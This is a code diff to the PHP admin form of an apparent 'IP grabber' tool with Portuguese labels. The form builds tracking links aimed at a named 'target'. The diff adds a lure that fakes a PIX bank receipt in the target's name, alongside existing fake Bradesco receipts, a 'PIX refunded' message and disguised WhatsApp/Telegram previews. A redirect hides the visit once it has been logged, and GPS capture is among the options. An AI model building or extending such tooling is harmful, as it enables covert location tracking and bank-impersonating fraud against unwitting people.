@@ -114,9 +114,10 @@ class IpGrabberResource extends Resource
                     Forms\Components\Select::make('preview_tipo')
                         ->label('Tipo de link')
                         ->options([
-                            'mensagem' => 'Mensagem do sistema',
+                            'mensagem' => 'Mensagem Customizada',
                             'noticia' => 'Notícia externa',
                             'pix_bradesco' => 'PIX Bradesco (comprovante)',
+                            'pix_nome_alvo' => 'Comprovante PIX em nome do alvo',
                         ])
                         ->default('mensagem')
                         ->selectablePlaceholder(false)
@@ -143,11 +144,23 @@ class IpGrabberResource extends Resource
                             IpGrabber::DEFAULT_CLICK_MESSAGE => IpGrabber::DEFAULT_CLICK_MESSAGE,
                             'Sistema fora do ar' => 'Sistema fora do ar',
                             'PIX Estornado' => 'PIX Estornado',
+                            'Redirecionar para página' => 'Redirecionar para página',
                         ])
                         ->default(IpGrabber::DEFAULT_CLICK_MESSAGE)
                         ->selectablePlaceholder(false)
+                        ->live()
                         ->required()
-                        ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'pix_bradesco'], true))
+                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
+                        ->columnSpanFull(),
+
+                    Forms\Components\TextInput::make('redirect_url')
+                        ->label('URL de redirecionamento')
+                        ->placeholder('https://site.com/pagina')
+                        ->url()
+                        ->maxLength(255)
+                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'mensagem' && $get('mensagem') === 'Redirecionar para página')
+                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem' && $get('mensagem') === 'Redirecionar para página')
+                        ->helperText('Após registrar o acesso, o navegador será direcionado para esta URL.')
                         ->columnSpanFull(),
 
                     Forms\Components\TextInput::make('noticia_url')
@@ -158,6 +171,15 @@ class IpGrabberResource extends Resource
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                         ->helperText('O sistema usará título, descrição e imagem da notícia no preview. Ao clicar, o alvo será encaminhado para esta URL.')
+                        ->columnSpanFull(),
+
+                    Forms\Components\TextInput::make('nome_alvo')
+                        ->label('Nome do alvo')
+                        ->placeholder('Ex: João da Silva')
+                        ->maxLength(60)
+                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
+                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
+                        ->helperText('Nome que será escrito automaticamente no comprovante PIX com a data e hora atuais.')
                         ->columnSpanFull(),
 
                     Forms\Components\Toggle::make('capture_gps')
@@ -182,7 +204,7 @@ class IpGrabberResource extends Resource
             \Filament\Schemas\Components\Section::make('Preview no WhatsApp / Telegram')
                 ->description('O que aparece quando o link é colado antes de ser clicado.')
                 ->collapsed()
-                ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'pix_bradesco'], true))
+                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                 ->components([
                     Forms\Components\TextInput::make('og_titulo')
                         ->label('Título do preview')
@@ -206,7 +228,6 @@ class IpGrabberResource extends Resource
                             }
 
                             $set('preview_usar_url', false);
-                            $set('preview_usar_nome_alvo', false);
                         })
                         ->helperText('A imagem enviada no upload será usada no preview.')
                         ->columnSpanFull(),
@@ -221,24 +242,8 @@ class IpGrabberResource extends Resource
                             }
 
                             $set('preview_usar_upload', false);
-                            $set('preview_usar_nome_alvo', false);
                         })
                         ->helperText('A URL informada será usada como imagem do preview.')
-                        ->columnSpanFull(),
-
-                    Forms\Components\Toggle::make('preview_usar_nome_alvo')
-                        ->label('Gerar comprovante em nome do alvo')
-                        ->default(false)
-                        ->live()
-                        ->afterStateUpdated(function (Set $set, ?bool $state): void {
-                            if (! $state) {
-                                return;
-                            }
-
-                            $set('preview_usar_upload', false);
-                            $set('preview_usar_url', false);
-                        })
-                        ->helperText('O sistema gerará uma imagem de comprovante usando o nome informado.')
                         ->columnSpanFull(),
 
                     Forms\Components\FileUpload::make('og_imagem_upload')
@@ -264,14 +269,6 @@ class IpGrabberResource extends Resource
                         ->helperText('Tamanho ideal: 1200x630px.')
                         ->columnSpanFull(),
 
-                    Forms\Components\TextInput::make('nome_alvo')
-                        ->label('Nome do alvo')
-                        ->placeholder('Ex: João da Silva')
-                        ->maxLength(60)
-                        ->required(fn (Get $get): bool => (bool) $get('preview_usar_nome_alvo'))
-                        ->visible(fn (Get $get): bool => (bool) $get('preview_usar_nome_alvo'))
-                        ->helperText('Nome no comprovante — será escrito automaticamente na imagem pix-img-gerar.png com a data e hora atuais.')
-                        ->columnSpanFull(),
                 ]),
         ]);
     }
